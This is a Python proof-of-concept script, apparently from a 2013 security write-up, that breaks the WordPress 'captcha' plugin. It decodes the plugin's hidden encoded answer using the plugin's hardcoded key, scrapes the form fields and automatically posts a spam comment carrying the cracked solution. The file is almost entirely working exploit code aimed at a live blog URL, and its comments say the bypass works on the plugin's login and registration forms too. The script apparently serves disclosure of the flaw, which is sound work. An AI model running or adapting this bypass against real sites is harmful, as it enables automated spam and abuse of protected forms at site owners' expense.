import requests
import lxml.html
import hashlib
import base64

# A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and 
# should have a open comment form. This 'attack' works on every form that the plugin supports [E.g. registration,
# login, ...]. This renders the captcha completely useless.

# Some examples

#Calculation with timestamp: 1383770422 Encoded pWw= is decoded to 3 
#Calculation with timestamp: 1383773265 Encoded 3Ko= is decoded to 8 
#Calculation with timestamp: 1383772504 Encoded tNM= is decoded to 6 
#Calculation with timestamp: 1383770071 Encoded E08r is decoded to 10 
#Calculation with timestamp: 1383771712 Encoded VEA= is decoded to 0 
#Calculation with timestamp: 1383770645 Encoded aWPB is decoded to 16 
#Calculation with timestamp: 1383773392 Encoded MEa7 is decoded to 42 
#Calculation with timestamp: 1383772030 Encoded 2uA= is decoded to 4 
#Calculation with timestamp: 1383770004 Encoded lJ8= is decoded to 7 
#Calculation with timestamp: 1383770859 Encoded KvE= is decoded to 9 
#Calculation with timestamp: 1383772789 Encoded k1I= is decoded to 7 
#Calculation with timestamp: 1383773377 Encoded BAE= is decoded to 6 
#Calculation with timestamp: 1383770038 Encoded /HY= is decoded to 8 
#Calculation with timestamp: 1383768565 Encoded nmM= is decoded to 5 
#Calculation with timestamp: 1383765035 Encoded JPA= is decoded to 6 
#Calculation with timestamp: 1383770354 Encoded 9EZ3 is decoded to 12 
#Calculation with timestamp: 1383771119 Encoded KX4= is decoded to 1 
#Calculation with timestamp: 1383773236 Encoded eSc= is decoded to 7 
#Calculation with timestamp: 1383770716 Encoded J6w= is decoded to 1 
#Calculation with timestamp: 1383768040 Encoded fUg= is decoded to 1 
#Calculation with timestamp: 1383773167 Encoded 7Co= is decoded to 6 
#Calculation with timestamp: 1383770803 Encoded A3k= is decoded to 1 
#Calculation with timestamp: 1383771047 Encoded J1Q= is decoded to 8 
#Calculation with timestamp: 1383768079 Encoded fpg= is decoded to 6 
#Calculation with timestamp: 1383767787 Encoded uR8= is decoded to 2 
#Calculation with timestamp: 1383773077 Encoded pgg= is decoded to 4 
#Calculation with timestamp: 1383772657 Encoded KXI= is decoded to 3 
#Calculation with timestamp: 1383771187 Encoded Ct0= is decoded to 9 
#Calculation with timestamp: 1383767982 Encoded Y6U= is decoded to 3 
#Calculation with timestamp: 1383773155 Encoded 9wpu is decoded to 11 
#Calculation with timestamp: 1383767071 Encoded ejeX is decoded to 27 
#Calculation with timestamp: 1383772116 Encoded dWyu is decoded to 15

# We see immediately: Any solution higher than 9 has a base64 encoded string
# without trailing equal sign. In this case the solution is between zero and nine
# and we can just guess with a hit probability of 1/10th. That's already a high
# enough probabilty for bruting and thus spamming a site :/

# Author: Nikolai Tschacher
# Date: 06.11.2013

TARGET = "http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/" # The landing site.
COMMENT_POST = "http://incolumitas.com/wp-comments-post.php" # The comment form to send POST requests at.
KEY = "bws_3110013"

def no_plugin(reason=""):
    print('''The plugin hidden fields couldn't be located. Make sure it is installed. Reason: {}'''.format(reason))
    exit(-1)

# This function reverses essentially the encoding of the hidden field cptch_result.
# It is exactly the same function with the same password as in the plugin source code.
def reverse(captcha, key, cptch_time):
    # just convert all but the captcha string to ascii
    key = key.encode('ascii')
    cptch_time = cptch_time.encode('ascii')
    
    print('[i] Trying to decode key: {}, captcha: {} and cptch_time: {}'.format(captcha, key, cptch_time))
    
    d = hashlib.md5()
    d.update(cptch_time)
    salt = d.digest()
    
    slen = len(captcha)
    seq = key
    gamma = bytearray()
    while len(gamma) < slen:
        sha = hashlib.sha1()
        L = bytearray()
        L.extend(seq)
        L.extend(gamma)
        L.extend(salt)
        sha.update(L)
        seq = sha.digest()
        gamma.extend(seq[:8])
    
    decoded = []
    captcha = base64.b64decode(bytes(captcha, 'ascii'));
    for c, cc in zip(captcha, gamma):
        decoded.append(chr(c ^ cc))
    return ''.join(decoded[1:])
    
if __name__ == '__main__':
        # Obtain post parameters from comment form
        try:
                r = requests.get('http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/')
        except requests.ConnectionError as cerr:
                print('Network problem occured: {}'.format(cerr))
        except requests.Timeout as terr:
                print('Connection timeout: {}'.format(terr))
        if not r.ok:
                print('HTTP Error:', r.status_code)

        # Parse parameters and solve captcha
        
        dom = lxml.html.fromstring(r.text.encode('utf-8'))
        try:
            el = dom.find_class('cptch_block')[0]
        except IndexError as ierr:
            no_plugin('find_class cptch_block') # No such CSS class found means most likely the plugin is not installed.
            
        captcha = el.text_content().strip()

        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'cptch_result':
                                result = c.attrib['value']
                        if c.attrib['name'] == 'cptch_time':
                                time = c.attrib['value']
                except KeyError:
                        pass

        el= dom.find_class('form-submit')[0]
        for c in el.getchildren():
                try:
                        if c.attrib['name'] == 'comment_post_ID':
                                post_id = c.attrib['value']
                        if c.attrib['name'] == 'comment_parent':
                                comment_parent = c.attrib['value']
                except KeyError:
                        pass

        print('[+] Captcha is "{}"'.format(captcha))
        
        # Try to crickiticrack it :P [Well we just use the decode() functon]
        solution = reverse(captcha, KEY, time)
        
        
        # No write a comment with the cracked captcha to proof that we provided the
        # correct solution.
        payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
        'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
        'comment': "Hi there! No protection from spammers!!!:D", 'submit': 'Post+Comment',
        'comment_post_ID': post_id, 'comment_parent': comment_parent}

        try:
                r = requests.post(COMMENT_POST, data=payload)
        except requests.ConnectionError as cerr:
                print('Network problem occured: {}'.format(cerr))
        except requests.Timeout as terr:
                print('Connection timeout: {}'.format(terr))
        if not r.ok:
                print('HTTP Error:', r.status_code)

